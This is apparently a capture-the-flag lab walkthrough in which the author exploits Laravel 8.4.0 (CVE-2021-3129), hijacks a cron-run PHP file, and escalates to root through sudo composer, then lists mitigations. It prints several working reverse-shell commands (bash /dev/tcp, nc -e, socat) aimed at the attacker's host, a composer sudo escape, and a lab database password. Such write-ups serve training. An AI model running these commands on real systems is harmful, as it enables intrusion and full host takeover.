## Introduction

In this walkthrough, I started by scanning the target and found that **ports 22 and 80** were open. Navigating to **port 80**, I discovered the application was running **Laravel version 8.4.0**. I searched for known vulnerabilities and found a **public exploit** for that version, which I used to gain **initial access**.

During enumeration, I found a **cron job** being executed by a different **low-privileged user**. I injected a **reverse shell** into the cron job and gained access as that user. Further enumeration revealed that this user had **sudo privileges to run the `composer` binary**. I took advantage of this misconfiguration and escalated privileges to gain **root access**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

We usually skip SSH.

## Web

### Port 80

- Version - Apache httpd 2.4.56 ((Debian))

```powershell
searchsploit apache 2.4
```

**No result.**

- Laravel 8.4.0

## Exploitation

[https://github.com/nth347/CVE-2021-3129_exploit](https://github.com/nth347/CVE-2021-3129_exploit)

Trying to get reverse shell:

```bash
 bash -i >& /dev/tcp/192.168.45.155/80 0>&1
```

`/var/www/html/lavita/storage/logs/laravel.log`

I tried nearly all bash reverse shell scripts I even transferred `.sh`  and `.elf` scripts to the target and executed but they didn’t work, maybe there is some type of protection.

```powershell
./exploit.py http://192.168.240.38 Monolog/RCE1 'which nc'
```

```powershell
./exploit.py http://192.168.240.38 Monolog/RCE1 '/usr/bin/nc -e /bin/sh 192.168.45.155 4444'
```

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444 #- on Kali

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.155:4444 #- on victim machine
```

I used socat and get a fully interactive shell.

that is my user’s password nevertheless I checked it against skunk and root too.

- **MySQL**

I couldn’t find any other interesting user in users table of lavita database:

```bash
mysql -u lavita -p
```

```sql
show databases;
show tables;
select * from users;
```

## Credentials

```bash
lavita : sdfquelw0kly9jgbx92
```

I run linpeas

1. `/var/www/html/lavita/rev.sh` - checked
2. `/usr/bin/write.ul` (Unknown SGID binary) 

![image.png](image%208.png)

![image.png](image%209.png)

## Lateral Movement

I checked if `rev.sh` is executed either by skunk or root user but it is not, but I found another file which is executed by skunk user and we have write access to it.  Run pspy to see if that file is executed on the machine:

```bash
./pspy64
```

![image.png](image%2010.png)

This file by itself is PHP file so I am gonna delete all file content and add there Ivan Sincek PHP reverse shell from the following website:

[Reverse Shell Generator](https://www.revshells.com/)

![image.png](image%2012.png)

As soon as the file gets executed we receive a reverse shell.

## Privilege Escalation

We are in sudo group. That means we can run any command with `sudo` and root password.

![image.png](image%2014.png)

We can run composer without root password.

According to GTFOBins:

```
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```

it created a temporary folder (`$TF`)stores there composer.json and run script where working folder is `$TF`. We should execute the command exactly as it is mentioned in sudo file. Therefore, let’s create/modify composer.json under `/var/www/html/lavita` . `*` at the end means sudo file does not care about that part there can be anything.

As `skunk` user does not have write privileges on `/var/www/html/lavita` folder we shift to www-data again.

```sql
echo '{"scripts":{"x":"/usr/bin/bash -i 0<&3 1>&3 2>&3"}}' > composer.json
sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script x
```

It returned some weird errors with `sh` so I changed to netcat reverse shell.

```sql
echo '{"scripts":{"x":"/usr/bin/nc -e /bin/sh 192.168.45.155 4445"}}' > composer.json
```

Now we are root!

## Mitigation

- **Keep Laravel and all dependencies updated** to patch known vulnerabilities like those in version 8.4.0.
- **Secure cron jobs**: Avoid having writable or user-editable cron jobs without proper access controls.
- **Restrict sudo access** to only necessary binaries, and avoid allowing execution of interpreters or package managers like `composer` via sudo.
- Apply the **principle of least privilege** to both users and services.
- Monitor cron jobs and system logs for **unauthorized modifications or execution patterns**.
